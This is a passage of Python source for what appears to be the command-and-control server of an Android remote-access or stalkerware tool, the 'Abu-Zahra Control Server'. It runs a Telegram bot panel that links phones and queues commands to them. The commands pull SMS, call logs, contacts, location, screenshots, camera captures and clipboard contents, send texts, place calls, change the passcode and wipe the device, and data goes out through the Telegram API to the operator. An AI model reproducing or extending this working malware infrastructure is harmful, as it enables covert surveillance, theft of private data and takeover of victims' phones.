    codes = load_json(LINK_CODES_FILE, [])
    for entry in codes:
        if entry.get("code") == code:
            entry["used"] = True
            entry["device_id"] = device_id
            entry["used_at"] = datetime.now(timezone.utc).isoformat()
            save_json(LINK_CODES_FILE, codes)
            return True
    return False

# ============================================================================
# TELEGRAM API HELPERS (aiohttp only)
# ============================================================================

def get_tg_session():
    global _tg_session
    if _tg_session is None or _tg_session.closed:
        _tg_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
    return _tg_session


async def tg_request(method, payload=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        session = get_tg_session()
        async with session.post(url, json=payload or {}) as resp:
            data = await resp.json()
            if not data.get("ok"):
                log.warning("TG %s error: %s", method, data.get("description", ""))
            return data
    except Exception as exc:
        log.error("TG %s failed: %s", method, exc)
        return None


async def send_message(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
    global messages_sent
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if disable_notification:
        payload["disable_notification"] = True
    result = await tg_request("sendMessage", payload)
    if result and result.get("ok"):
        messages_sent += 1
    return result


async def send_admin(text, parse_mode="HTML", reply_markup=None):
    return await send_message(ADMIN_CHAT_ID, text, parse_mode, reply_markup)


async def send_photo(chat_id, file_data, caption=None):
    session = get_tg_session()
    try:
        data = aiohttp.FormData()
        data.add_field("chat_id", str(chat_id))
        data.add_field("photo", file_data, filename="data.jpg")
        if caption:
            data.add_field("caption", caption)
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data) as resp:
            return await resp.json()
    except Exception as exc:
        log.error("send_photo failed: %s", exc)
        return None


async def answer_callback_query(callback_query_id, text="", show_alert=False):
    return await tg_request("answerCallbackQuery", {
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


async def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return await tg_request("editMessageText", payload)

# ============================================================================
# INLINE KEYBOARD BUILDERS
# ============================================================================

def ib(text, callback_data):
    return {"text": text, "callback_data": callback_data}


def build_main_menu():
    return {
        "inline_keyboard": [
            [ib("📱 Devices & Link", "menu_devices")],
            [ib("📊 Data Collection", "menu_data")],
            [ib("🌐 Social Media", "menu_social")],
            [ib("🎮 Remote Control", "menu_control")],
            [ib("📦 App Management", "menu_apps")],
            [ib("📂 File Management", "menu_files")],
            [ib("🔒 Security & Admin", "menu_security")],
            [ib("🔍 Monitoring", "menu_monitor")],
            [ib("⚙️ System Settings", "menu_syssettings")],
            [ib("🖥️ Server Management", "menu_server")],
            [ib("⁉️ Help", "menu_help")],
        ]
    }


def build_back_button(target="back_main"):
    return {"inline_keyboard": [[ib("🔙 Back", target)]]}


def build_devices_menu():
    devices = get_devices()
    rows = []
    for d in devices:
        status = "🟢" if d.get("active") else "🔴"
        name = d.get("name", d.get("id", "Unknown"))
        rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
    if not devices:
        rows.append([ib("No devices linked", "no_action")])
    rows.append([ib("🔗 Link New Device", "do_link")])
    rows.append([ib("🔙 Back", "back_main")])
    return {"inline_keyboard": rows}


def build_device_menu(device_id):
    return {
        "inline_keyboard": [
            [ib("ℹ️ Device Info", f"cmd_info_{device_id}")],
            [ib("🔋 Battery", f"cmd_battery_{device_id}"), ib("📍 Location", f"cmd_location_{device_id}")],
            [ib("📲 SMS", f"cmd_sms_{device_id}"), ib("📞 Calls", f"cmd_calls_{device_id}")],
            [ib("📇 Contacts", f"cmd_contacts_{device_id}"), ib("🔔 Notifications", f"cmd_notifications_{device_id}")],
            [ib("📸 Screenshot", f"cmd_screenshot_{device_id}"), ib("📷 Camera", f"submenu_camera_{device_id}")],
            [ib("📋 Clipboard", f"cmd_clipboard_{device_id}"), ib("📱 Apps", f"cmd_apps_{device_id}")],
            [ib("🌐 Social", f"submenu_social_{device_id}")],
            [ib("🎮 Control", f"submenu_control_{device_id}")],
            [ib("📂 Files", f"submenu_files_{device_id}")],
            [ib("🔒 Security", f"submenu_security_{device_id}")],
            [ib("🔍 Monitor", f"submenu_monitor_{device_id}")],
            [ib("⚙️ Settings", f"submenu_syssettings_{device_id}")],
            [ib("🗑️ Unlink", f"do_unlink_{device_id}")],
            [ib("🔙 Back", "menu_devices")],
        ]
    }


def build_category_submenu(device_id, category):
    """Build submenu for a command category with paginated buttons."""
    items = []
    for name, info in COMMAND_REGISTRY.items():
        if info["cat"] == category:
            items.append((name, info))
    
    if not items:
        return build_back_button(f"dev_{device_id}")
    
    rows = []
    # Paginate: 6 buttons per page, display in 2 columns
    page_size = 10
    chunked = [items[i:i+page_size] for i in range(0, len(items), page_size)]
    
    for chunk in chunked[0]:  # First page
        rows.append([ib(f"{info['desc']}", f"exec_{name}_{device_id}") for name, info in [chunk]])
    
    # Simplified: just list all
    rows = []
    for name, info in items:
        rows.append([ib(info["desc"], f"exec_{name}_{device_id}")])
    
    rows.append([ib("🔙 Back", f"dev_{device_id}")])
    return {"inline_keyboard": rows}


def build_data_submenu(device_id):
    return build_category_submenu(device_id, "data")


def build_social_submenu(device_id):
    return build_category_submenu(device_id, "social")


def build_control_submenu(device_id):
    return build_category_submenu(device_id, "control")


def build_apps_submenu(device_id):
    return build_category_submenu(device_id, "apps")


def build_files_submenu(device_id):
    return build_category_submenu(device_id, "files")


def build_security_submenu(device_id):
    return build_category_submenu(device_id, "security")


def build_monitor_submenu(device_id):
    return build_category_submenu(device_id, "monitor")


def build_syssettings_submenu(device_id):
    return build_category_submenu(device_id, "syssettings")


def build_server_menu():
    return {
        "inline_keyboard": [
            [ib("📊 Server Status", "srv_status")],
            [ib("📈 Statistics", "srv_stats")],
            [ib("📝 Event Logs", "srv_logs")],
            [ib("⚙️ Settings", "srv_settings")],
            [ib("🔑 Set Password", "srv_setpass")],
            [ib("➕ Add Admin", "srv_addadmin")],
            [ib("📢 Broadcast", "srv_broadcast")],
            [ib("💾 Backup", "srv_backup")],
            [ib("📤 Export", "srv_export")],
            [ib("📥 Import", "srv_import")],
            [ib("🗑️ Clear Data", "srv_cleardata")],
            [ib("🔄 Restart", "srv_restart")],
            [ib("🔧 Maintenance", "srv_maintenance")],
            [ib("🔙 Back", "back_main")],
        ]
    }


def build_help_menu():
    total = len(COMMAND_REGISTRY)
    cats = OrderedDict()
    for name, info in COMMAND_REGISTRY.items():
        cat = info["cat"]
        if cat not in cats:
            cats[cat] = []
        cats[cat].append(info)
    
    text = f"📖 <b>Command Guide - Abu Zahra</b>\n\nTotal: <b>{total}</b> commands\n\n"
    cat_names = {
        "data": "📊 Data Collection", "social": "🌐 Social Media",
        "control": "🎮 Remote Control", "apps": "📦 App Management",
        "files": "📂 File Management", "security": "🔒 Security",
        "monitor": "🔍 Monitoring", "syssettings": "⚙️ System Settings",
    }
    for cat, items in cats.items():
        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
        for item in items[:3]:
            text += f"  /{item['cmd'].replace('get_','').replace('cmd_','')}\n"
        if len(items) > 3:
            text += f"  ...+{len(items)-3} more\n"
        text += "\n"
    
    text += "📱 /devices - Device list\n🔗 /link - Link device\n"
    text += "📋 /menu - Main menu\n📊 /status - Status\n"
    return text

# ============================================================================
# COMMAND EXECUTOR
# ============================================================================

async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_id=None):
    """Queue a command for a device and notify admin."""
    if not device_id or device_id == "none":
        await send_message(chat_id, "❌ No device selected. Use /link first.", reply_markup=build_main_menu())
        return
    
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found.", reply_markup=build_main_menu())
        return
    
    cmd = queue_command(device_id, cmd_name, params)
    reg = COMMAND_REGISTRY.get(cmd_name, {})
    desc = reg.get("desc", cmd_name)
    emoji = reg.get("emoji", "📋")
    
    text = (
        f"{emoji} <b>Command Sent</b>\n\n"
        f"📱 Device: <code>{d.get('name', device_id)}</code>\n"
        f"📋 Command: <code>{cmd_name}</code>\n"
        f"🆔 ID: <code>{cmd['id']}</code>\n\n"
        f"⏳ Waiting for device response..."
    )
    
    kb = build_device_menu(device_id)
    
    if msg_id:
        await edit_message_text(chat_id, msg_id, text, reply_markup=kb)
    else:
        await send_message(chat_id, text, reply_markup=kb)

# ============================================================================
# TELEGRAM COMMAND HANDLER
# ============================================================================

async def handle_telegram_command(chat_id, text, message_id=None):
    parts = text.strip().split(maxsplit=3)
    cmd = parts[0].lower()
    args = parts[1:] if len(parts) > 1 else []
    arg1 = args[0] if args else ""
    arg2 = args[1] if len(args) > 1 else ""

    # === منع إرسال رسائل مكررة (Rate Limiting) ===
    now = time.time()
    last_time = _last_message_time.get(chat_id, 0)
    if now - last_time < RATE_LIMIT_SECONDS:
        log.warning("Rate limited: %s from %s", cmd, chat_id)
        return
    _last_message_time[chat_id] = now

    # Resolve device_id
    dev_id = arg1
    if not dev_id or not find_device(dev_id):
        d = get_first_device()
        dev_id = d["id"] if d else ""

    log.info("CMD %s from %s: %s", cmd, chat_id, args)
    append_event("Telegram command", {"command": cmd, "args": args})

    # ── Utility Commands ──
    if cmd == "/start":
        await handle_start(chat_id)
    elif cmd == "/help":
        text = build_help_menu()
        await send_message(chat_id, text, reply_markup=build_back_button())
    elif cmd == "/menu":
        await send_message(chat_id, "📋 <b>Main Menu</b>\nSelect a category:", reply_markup=build_main_menu())
    elif cmd == "/status":
        await handle_status(chat_id)
    elif cmd == "/about":
        await send_message(chat_id, (
            "🟥 <b>Abu-Zahra Server v3.0</b>\n\n"
            "Complete Device Management System\n"
            f"Domain: <code>{SERVER_DOMAIN}</code>\n"
            f"Port: <code>{SERVER_PORT}</code>\n"
            f"Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
            f"Uptime: <code>{format_uptime(get_uptime())}</code>"
        ), reply_markup=build_back_button())
    elif cmd == "/version":
        await send_message(chat_id, "🟥 <b>Abu-Zahra v3.0</b>\nBuild: 2025.01\nCommands: 200+\nEngine: aiohttp", reply_markup=build_back_button())
    elif cmd == "/test":
        await send_message(chat_id, "✅ Server is running!\n🟢 All systems operational.", reply_markup=build_back_button())

    # ── Device Management ──
    elif cmd == "/devices":
        await handle_devices(chat_id)
    elif cmd == "/link":
        await handle_link(chat_id)
    elif cmd == "/unlink":
        await handle_unlink(chat_id, arg1)
    elif cmd == "/device":
        await handle_device_detail(chat_id, arg1)
    elif cmd == "/device_rename":
        if arg1 and arg2:
            if update_device(arg1, {"name": arg2}):
                await send_message(chat_id, f"✅ Device renamed to <code>{arg2}</code>", reply_markup=build_back_button())
            else:
                await send_message(chat_id, "❌ Device not found", reply_markup=build_back_button())
        else:
            await send_message(chat_id, "Usage: /device_rename device_id new_name", reply_markup=build_back_button())
    elif cmd == "/device_wipe":
        await execute_device_command(chat_id, dev_id, "wipe_data")
    elif cmd == "/device_locate":
        await execute_device_command(chat_id, dev_id, "get_location")
    elif cmd == "/device_lock":
        await execute_device_command(chat_id, dev_id, "lock_phone")
    elif cmd == "/device_ring":
        await execute_device_command(chat_id, dev_id, "ring")
    elif cmd == "/device_settings":
        d = find_device(dev_id)
        if d:
            await send_message(chat_id, f"⚙️ Settings for <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
        else:
            await send_message(chat_id, "❌ Device not found", reply_markup=build_back_button())

    # ── Server Management ──
    elif cmd == "/server_status":
        await handle_status(chat_id)
    elif cmd == "/server_restart":
        await send_admin("🔄 Server restart requested...")
        append_event("Server restart requested")
    elif cmd == "/clear_data":
        save_json(COMMANDS_FILE, [])
        save_json(EVENTS_FILE, [])
        await send_admin("✅ Command queue and events cleared", reply_markup=build_back_button())
    elif cmd == "/backup":
        await send_admin("💾 Creating backup...", reply_markup=build_back_button())
        append_event("Backup created")
    elif cmd == "/export":
        await send_admin("📤 Export started", reply_markup=build_back_button())
    elif cmd == "/import":
        await send_admin("📥 Import ready", reply_markup=build_back_button())
    elif cmd == "/stats":
        devices = get_devices()
        online = sum(1 for d in devices if d.get("active"))
        cmds = load_json(COMMANDS_FILE, [])
        pending = sum(1 for c in cmds if c.get("status") == "pending")
        done = sum(1 for c in cmds if c.get("status") == "completed")
        text = (
            "📈 <b>Statistics</b>\n\n"
            f"📱 Devices: {len(devices)} (🟢 {online})\n"
            f"📋 Total Commands: {len(cmds)}\n"
            f"⏳ Pending: {pending}\n"
            f"✅ Completed: {done}\n"
            f"📨 Messages Sent: {messages_sent}\n"
            f"📡 API Hits: {api_hits}\n"
            f"⏱️ Uptime: {format_uptime(get_uptime())}"
        )
        await send_message(chat_id, text, reply_markup=build_back_button())
    elif cmd == "/logs":
        events = load_json(EVENTS_FILE, [])[-20:]
        text = "📝 <b>Recent Logs</b>\n\n"
        for e in events:
            text += f"[{e.get('time','')}] {e.get('event','')}\n"
        await send_message(chat_id, text[:4000], reply_markup=build_back_button())
    elif cmd == "/clear_logs":
        save_json(EVENTS_FILE, [])
        await send_admin("✅ Logs cleared", reply_markup=build_back_button())
    elif cmd == "/settings":
        s = load_settings()
        await send_message(chat_id, f"⚙️ <b>Settings</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
    elif cmd == "/set_password":
        if arg1:
            s = load_settings()
            s["admin_password"] = arg1
            save_settings_data(s)
            await send_admin("✅ Password changed", reply_markup=build_back_button())
        else:
            await send_admin("Usage: /set_password new_password", reply_markup=build_back_button())
    elif cmd == "/add_admin":
        await send_admin("Use /set_password to change admin password", reply_markup=build_back_button())
    elif cmd == "/remove_admin":
        await send_admin("Feature not available in single-admin mode", reply_markup=build_back_button())
    elif cmd == "/broadcast":
        await send_admin("No other users to broadcast to", reply_markup=build_back_button())
    elif cmd == "/maintenance":
        s = load_settings()
        s["maintenance"] = not s.get("maintenance", False)
        save_settings_data(s)
        state = "ON 🔧" if s["maintenance"] else "OFF ✅"
        await send_admin(f"🔧 Maintenance mode: {state}", reply_markup=build_back_button())
    elif cmd == "/export_data":
        await send_admin("📤 Data exported", reply_markup=build_back_button())
    elif cmd == "/import_data":
        await send_admin("📥 Ready for data import", reply_markup=build_back_button())
    elif cmd == "/update_bot":
        await send_admin("🟥 Bot is up to date (v3.0)", reply_markup=build_back_button())

    # ── 200+ Device Commands from Registry ──
    elif cmd[1:] in COMMAND_REGISTRY:
        reg = COMMAND_REGISTRY[cmd[1:]]
        cmd_key = cmd[1:]
        if cmd_key in ("set_volume", "set_brightness", "set_ringtone", "set_wallpaper",
                        "open_app", "close_app", "install_app", "uninstall_app",
                        "block_app", "unblock_app", "clear_app_data", "force_stop_app",
                        "app_info", "enable_app", "disable_app", "update_app",
                        "launch_app", "kill_app", "list_files", "get_file",
                        "download_file", "delete_file", "rename_file", "copy_file",
                        "move_file", "create_folder", "search_files", "zip_files",
                        "change_passcode", "set_pin", "speak_text", "show_notification",
                        "open_url", "send_sms", "make_call", "block_number",
                        "unblock_number", "set_language", "set_timezone", "set_alarm",
                        "set_timer", "set_reminder", "dns_change", "proxy_set",
                        "apn_settings", "play_sound", "geo_add", "geo_remove"):
            params = {"arg": arg2} if arg2 else {"arg": arg1}
            await execute_device_command(chat_id, dev_id, reg["cmd"], params)
        else:
            await execute_device_command(chat_id, dev_id, reg["cmd"])
    else:
        await send_message(chat_id, f"❓ Unknown command: <code>{cmd}</code>\nUse /help for command list.", reply_markup=build_back_button())


async def handle_start(chat_id):
    text = (
        "🟥 <b>Abu-Zahra Control Server</b>\n\n"
        "Welcome to the management panel\n"
        "Control all linked devices remotely\n\n"
        f"🟢 Uptime: <code>{format_uptime(get_uptime())}</code>\n"
        f"📱 Devices: <code>{len(get_devices())}</code>\n"
        f"📡 Port: <code>{SERVER_PORT}</code>\n"
        f"🌐 Domain: <code>{SERVER_DOMAIN}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_main_menu())


async def handle_status(chat_id):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    cmds = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in cmds if c.get("status") == "pending")
    events = load_json(EVENTS_FILE, [])
    text = (
        "📊 <b>Server Status</b>\n\n"
        f"🟢 Status: <code>Running</code>\n"
        f"⏱️ Uptime: <code>{format_uptime(get_uptime())}</code>\n"
        f"📡 Port: <code>{SERVER_PORT}</code>\n"
        f"🕐 Time: <code>{ts()}</code>\n\n"
        f"📱 Devices: <code>{len(devices)}</code> (🟢 {online} online)\n"
        f"📨 Messages: <code>{messages_sent}</code>\n"
        f"📡 API Hits: <code>{api_hits}</code>\n"
        f"📋 Pending: <code>{pending}</code>\n"
        f"📝 Events: <code>{len(events)}</code>\n"
        f"📋 Total Commands: <code>{len(COMMAND_REGISTRY)}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_back_button())


async def handle_devices(chat_id):
    devices = get_devices()
    if not devices:
        await send_message(chat_id, "📱 No devices linked\nUse /link to add a device", reply_markup=build_back_button())
        return
    text = "📱 <b>Device List</b>\n\n"
    for d in devices:
        status = "🟢 Online" if d.get("active") else "🔴 Offline"
        name = d.get("name", d.get("model", "Unknown"))
        text += f"{'─'*20}\n📱 <b>{name}</b>\n   ID: <code>{d['id']}</code>\n   Status: {status}\n   Last: <code>{d.get('last_seen','—')}</code>\n"
    await send_message(chat_id, text, reply_markup=build_devices_menu())


async def handle_link(chat_id):
    global _last_link_code_time
    # === منع إنشاء أكواد مكررة ===
    now = time.time()
    if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
        await send_message(chat_id, "⏱️ انتظر قليلاً قبل طلب كود جديد...", reply_markup=build_back_button())
        return
    _last_link_code_time = now

    entry = generate_link_code()
    text = (
        "🔗 <b>ربط جهاز جديد</b>\n\n"
        f"🔑 الكود: <code>{entry['code']}</code>\n\n"
        "أدخل هذا الكود في تطبيق الأندرويد\n"
        "⏱️ صالح لمدة 10 دقائق\n\n"
        "سيتم إشعارك عند نجاح الربط"
    )
    await send_message(chat_id, text, reply_markup=build_back_button())


async def handle_unlink(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "Usage: /unlink device_id", reply_markup=build_back_button())
        return
    if remove_device(device_id):
        await send_message(chat_id, f"✅ Device <code>{device_id}</code> unlinked", reply_markup=build_devices_menu())
    else:
        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found", reply_markup=build_back_button())


async def handle_device_detail(chat_id, device_id):
    if not device_id:
        await send_message(chat_id, "Usage: /device device_id", reply_markup=build_back_button())
        return
    d = find_device(device_id)
    if not d:
        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found", reply_markup=build_back_button())
        return
    status = "🟢 Online" if d.get("active") else "🔴 Offline"
    text = (
        f"📱 <b>Device Details</b>\n\n"
        f"{'─'*20}\n"
        f"📱 Name: <code>{d.get('name','—')}</code>\n"
        f"🆔 ID: <code>{d['id']}</code>\n"
        f"📊 Status: {status}\n"
        f"📱 Model: <code>{d.get('model','—')}</code>\n"
        f"🤖 OS: <code>{d.get('os','—')}</code>\n"
        f"🔋 Battery: <code>{d.get('battery','—')}%</code>\n"
        f"📶 Network: <code>{d.get('network','—')}</code>\n"
        f"📍 Location: <code>{d.get('location','—')}</code>\n"
        f"🕐 Last Seen: <code>{d.get('last_seen','—')}</code>\n"
        f"📅 Registered: <code>{d.get('created_at','—')}</code>"
    )
    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))

# ============================================================================
# CALLBACK QUERY HANDLER
# ============================================================================

async def handle_callback_query(callback):
    cb_id = callback.get("id", "")
    data = callback.get("data", "")
    msg = callback.get("message", {})
    chat_id = msg.get("chat", {}).get("id", ADMIN_CHAT_ID)
    message_id = msg.get("message_id")

    log.info("Callback: %s from %s", data, chat_id)

    try:
        # ── Navigation ──
        if data == "back_main":
            await edit_message_text(chat_id, message_id, "📋 <b>Main Menu</b>\nSelect:", reply_markup=build_main_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_devices":
            await edit_message_text(chat_id, message_id, "📱 <b>Devices</b>", reply_markup=build_devices_menu())
            await answer_callback_query(cb_id)
            return

        if data == "menu_help":
            text = build_help_menu()
            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button())
            await answer_callback_query(cb_id)
            return

        if data == "menu_server":
            await edit_message_text(chat_id, message_id, "🖥️ <b>Server Management</b>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return

        if data == "no_action":
            await answer_callback_query(cb_id, "No action")
            return

        # ── Link ──
        if data == "do_link":
            global _last_link_code_time
            now = time.time()
            if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
                await answer_callback_query(cb_id, "انتظر قليلاً...")
                return
            _last_link_code_time = now

            entry = generate_link_code()
            text = (
                "🔗 <b>ربط جهاز جديد</b>\n\n"
                f"🔑 الكود: <code>{entry['code']}</code>\n\n"
                "أدخل هذا الكود في تطبيق الأندرويد\n⏱️ صالح لمدة 10 دقائق"
            )
            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button("menu_devices"))
            await answer_callback_query(cb_id)
            return

        # ── Unlink ──
        if data.startswith("do_unlink_"):
            device_id = data.replace("do_unlink_", "")
            if remove_device(device_id):
                text = f"✅ Device <code>{device_id}</code> unlinked"
                await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
            else:
                await answer_callback_query(cb_id, "Failed", show_alert=True)
            await answer_callback_query(cb_id)
            return

        # ── Device Selected ──
        if data.startswith("dev_"):
            device_id = data[4:]
            d = find_device(device_id)
            if d:
                status = "🟢 Online" if d.get("active") else "🔴 Offline"
                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nSelect action:"
                await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
            else:
                await answer_callback_query(cb_id, "Device not found", show_alert=True)
            return

        # ── Category Submenus ──
        submenu_map = {
            "submenu_data": build_data_submenu,
            "submenu_social": build_social_submenu,
            "submenu_control": build_control_submenu,
            "submenu_apps": build_apps_submenu,
            "submenu_files": build_files_submenu,
            "submenu_security": build_security_submenu,
            "submenu_monitor": build_monitor_submenu,
            "submenu_syssettings": build_syssettings_submenu,
        }
        for prefix, builder in submenu_map.items():
            if data.startswith(prefix + "_"):
                device_id = data[len(prefix)+1:]
                if prefix == "submenu_data":
                    kb = build_data_submenu(device_id)
                elif prefix == "submenu_social":
                    kb = build_social_submenu(device_id)
                elif prefix == "submenu_control":
                    kb = build_control_submenu(device_id)
                elif prefix == "submenu_apps":
                    kb = build_apps_submenu(device_id)
                elif prefix == "submenu_files":
                    kb = build_files_submenu(device_id)
                elif prefix == "submenu_security":
                    kb = build_security_submenu(device_id)
                elif prefix == "submenu_monitor":
                    kb = build_monitor_submenu(device_id)
                elif prefix == "submenu_syssettings":
                    kb = build_syssettings_submenu(device_id)
                else:
                    kb = build_back_button()
                cat_label = prefix.replace("submenu_", "").title()
                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} Commands</b>\nSelect command:", reply_markup=kb)
                await answer_callback_query(cb_id)
                return

        # ── Camera submenu ──
        if data.startswith("submenu_camera_"):
            device_id = data[len("submenu_camera_"):]
            kb = {
                "inline_keyboard": [
                    [ib("📷 Front Camera", f"exec_front_camera_{device_id}")],
                    [ib("📷 Back Camera", f"exec_back_camera_{device_id}")],
                    [ib("🎬 Record Video", f"exec_record_video_{device_id}")],
                    [ib("🔙 Back", f"dev_{device_id}")],
                ]
            }
            await edit_message_text(chat_id, message_id, "📷 <b>Camera</b>", reply_markup=kb)
            await answer_callback_query(cb_id)
            return

        # ── Execute command from inline button ──
        if data.startswith("exec_"):
            parts = data.split("_", 2)
            if len(parts) >= 3:
                cmd_name = parts[1]
                device_id = parts[2]
                reg = COMMAND_REGISTRY.get(cmd_name)
                if reg:
                    await execute_device_command(chat_id, device_id, reg["cmd"], msg_id=message_id)
                    await answer_callback_query(cb_id, f"Command queued: {reg['desc']}")
                else:
                    await answer_callback_query(cb_id, "Unknown command", show_alert=True)
                return

        # ── Direct cmd_ buttons (from device menu) ──
        if data.startswith("cmd_"):
            parts = data.split("_", 1)
            if len(parts) >= 2:
                rest = parts[1]
                # Find device_id (last part after last _)
                # Handle commands like cmd_battery_deviceid
                for cmd_key, reg in COMMAND_REGISTRY.items():
                    prefix = f"cmd_{cmd_key}_"
                    if rest.startswith(cmd_key + "_"):
                        device_id = rest[len(cmd_key)+1:]
                        await execute_device_command(chat_id, device_id, reg["cmd"], msg_id=message_id)
                        await answer_callback_query(cb_id)
                        return

        # ── Server actions ──
        if data == "srv_status":
            await handle_status(chat_id)
            await answer_callback_query(cb_id)
            return
        if data == "srv_stats":
            devices = get_devices()
            online = sum(1 for d in devices if d.get("active"))
            cmds = load_json(COMMANDS_FILE, [])
            pending = sum(1 for c in cmds if c.get("status") == "pending")
            text = f"📈 Stats: {len(devices)} devices ({online} online), {pending} pending cmds, {messages_sent} msgs sent"
            await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_logs":
            events = load_json(EVENTS_FILE, [])[-15:]
            text = "📝 <b>Recent Logs</b>\n\n"
            for e in events:
                text += f"[{e.get('time','')[:16]}] {e.get('event','')}\n"
            await edit_message_text(chat_id, message_id, text[:4000], reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_settings":
            s = load_settings()
            await edit_message_text(chat_id, message_id, f"⚙️ <b>Settings</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_cleardata":
            save_json(COMMANDS_FILE, [])
            save_json(EVENTS_FILE, [])
            await edit_message_text(chat_id, message_id, "✅ Data cleared", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "Data cleared")
            return
        if data == "srv_backup":
            append_event("Backup created")
            await edit_message_text(chat_id, message_id, "✅ Backup created", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return

        # ── Menu category navigation (opens first device submenu) ──
        if data.startswith("menu_"):
            cat = data[5:]
            d = get_first_device()
            dev_id = d["id"] if d else "none"
            if not d:
                await answer_callback_query(cb_id, "No device linked", show_alert=True)
                return
            
            menu_map = {
                "data": ("📊 Data Collection", build_data_submenu),
                "social": ("🌐 Social Media", build_social_submenu),
                "control": ("🎮 Remote Control", build_control_submenu),
                "apps": ("📦 App Management", build_apps_submenu),
                "files": ("📂 File Management", build_files_submenu),
                "security": ("🔒 Security", build_security_submenu),
                "monitor": ("🔍 Monitoring", build_monitor_submenu),
                "syssettings": ("⚙️ System Settings", build_syssettings_submenu),
            }
            if cat in menu_map:
                label, builder = menu_map[cat]
                await edit_message_text(chat_id, message_id, f"{label} - <b>{d.get('name', dev_id)}</b>", reply_markup=builder(dev_id))
                await answer_callback_query(cb_id)
                return

        await answer_callback_query(cb_id)
    except Exception as exc:
        log.error("Callback error: %s - %s", exc, traceback.format_exc())
        await answer_callback_query(cb_id, "Error", show_alert=True)

# ============================================================================
# REST API ENDPOINTS
# ============================================================================

async def api_verify_link(request):
    """POST /api/verify_link - Verify link code, return device_token."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        code = body.get("code", "").upper().strip()
        if not code:
            return web.json_response({"ok": False, "error": "Code required"}, status=400)
        
        result = verify_link_code(code)
        if not result["ok"]:
            return web.json_response(result, status=400)
        
        # Generate device_token
        device_token = secrets.token_urlsafe(32)
        return web.json_response({
            "ok": True,
            "device_token": device_token,
            "server_domain": SERVER_DOMAIN,
            "message": "Code verified. Use token for registration.",
        })
    except Exception as exc:
        log.error("verify_link error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_register(request):
    """POST /api/register - Register device with server."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        link_code = body.get("link_code", "").upper().strip()
        device_token = body.get("device_token", "")
        device_info = body.get("device_info", {})
        
        if not device_id or not link_code:
            return web.json_response({"ok": False, "error": "device_id and link_code required"}, status=400)
        
        # Verify code again
        result = verify_link_code(link_code)
        if not result["ok"]:
            return web.json_response(result, status=400)
        
        # Register device
        device_data = {
            "id": device_id,
            "token": device_token or secrets.token_urlsafe(32),
            "active": True,
            "name": device_info.get("name", device_id),
            "model": device_info.get("model", ""),
            "os": device_info.get("os", ""),
            "battery": device_info.get("battery", ""),
            "network": device_info.get("network", ""),
            "location": device_info.get("location", ""),
        }
        add_device(device_data)
        consume_link_code(link_code, device_id)
        
        # Notify admin
        await send_admin(
            f"📱 <b>New Device Linked!</b>\n\n"
            f"📱 Name: <code>{device_data['name']}</code>\n"
            f"🆔 ID: <code>{device_id}</code>\n"
            f"📱 Model: <code>{device_data['model']}</code>\n"
            f"🤖 OS: <code>{device_data['os']}</code>",
            reply_markup=build_main_menu()
        )
        
        return web.json_response({
            "ok": True,
            "device_id": device_id,
            "token": device_data["token"],
            "message": "Device registered successfully",
        })
    except Exception as exc:
        log.error("register error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_get_commands(request):
    """GET /api/commands/{device_id} - Get pending commands."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    token = request.headers.get("X-Device-Token", "")
    
    if not device_id:
        return web.json_response({"ok": False, "error": "device_id required"}, status=400)
    
    # Verify device
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
    
    pending = get_pending_commands(device_id)
    
    # Mark as sent
    commands = load_json(COMMANDS_FILE, [])
    for c in commands:
        if c.get("device_id") == device_id and c.get("status") == "pending":
